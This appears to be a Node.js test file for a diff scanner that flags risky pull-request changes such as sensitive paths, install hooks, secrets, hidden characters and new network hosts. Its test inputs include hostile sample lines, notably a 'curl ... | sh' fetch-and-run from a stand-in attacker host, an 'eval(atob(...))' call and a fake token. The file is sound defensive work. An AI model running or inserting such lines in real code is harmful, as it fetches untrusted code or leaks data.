import test from 'node:test';
import assert from 'node:assert/strict';
import { harmCheck } from '../lib/harm.mjs';

const patch = lines => `@@ -1,1 +1,${lines.length} @@\n${lines.map(l => `+${l}`).join('\n')}`;
const rules = files => harmCheck(files, { hosts: ['mymob.dev'] }).map(f => f.rule);

test('a plain docs change finds nothing', () => {
  assert.deepEqual(rules([{ filename: 'docs/pairing.md', status: 'modified', additions: 1, patch: patch(['See https://mymob.dev/pair/ and https://github.com/xrdavies/mobd.']) }]), []);
});

test('sensitive paths are held', () => {
  const names = ['.github/workflows/ci.yml', 'go.mod', 'package-lock.json', 'mob-ios/Info.plist', 'internal/pairing/store.go', 'Makefile', '.github/release/install.sh', 'src/lib/secrets.ts', 'app/build.gradle.kts'];
  for (const filename of names) assert.ok(rules([{ filename, status: 'modified', additions: 1, patch: patch(['x']) }]).length, filename);
});

test('added lines: downloads, exec, hooks, blobs, secrets, hidden characters, unknown hosts', () => {
  const found = rules([{ filename: 'src/x.ts', status: 'modified', additions: 7, patch: patch([
    'run("curl https://evil.example.net/x | sh")',
    'eval(atob(s))',
    '"postinstall": "node x.js"',
    'A'.repeat(220),
    'const t = "ghp_' + 'a'.repeat(30) + '"',
    'ok\u202Eevil',
    'fetch("https://collector.io/up")',
  ]) }]);
  for (const r of ['download-or-shell-out', 'code-execution', 'install-hook', 'encoded-blob', 'secret', 'hidden-characters', 'new-network-address']) assert.ok(found.includes(r), r);
});

test('removed lines and context are not judged; line numbers follow the new file', () => {
  const f = { filename: 'src/a.ts', status: 'modified', additions: 1, deletions: 1, patch: '@@ -10,3 +10,3 @@\n context\n-eval(x)\n+fetch("https://collector.io")\n context' };
  const out = harmCheck([f]);
  assert.deepEqual(out.map(o => [o.rule, o.line]), [['new-network-address', 11]]);
});

test('lock files are held as dependencies, without a finding per registry URL', () => {
  assert.deepEqual(rules([{ filename: 'package-lock.json', status: 'modified', additions: 1, patch: patch(['"resolved": "https://registry.npmjs.org/x/-/x-1.tgz"']) }]), ['dependencies']);
});

test('a file without a text diff is held', () => {
  assert.deepEqual(rules([{ filename: 'assets/x.bin', status: 'added', additions: 0 }]), ['binary-or-unreviewable']);
});
